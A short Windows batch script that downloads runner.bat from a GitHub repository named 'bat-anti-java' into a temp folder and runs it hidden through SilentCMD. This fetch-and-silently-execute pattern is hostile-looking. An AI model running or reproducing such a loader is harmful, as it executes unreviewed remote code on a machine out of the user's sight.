@echo off
cd %temp%
cd permanent
curl -O https://raw.githubusercontent.com/Easty101/bat-anti-java/main/runner.bat
start C:\path\to\SilentCMD\SilentCMD.exe %temp%\permanent\runner.bat
REM !Change 'C:\path\to\SilentCMD\SilentCMD.exe' to your actual path! ################################################################
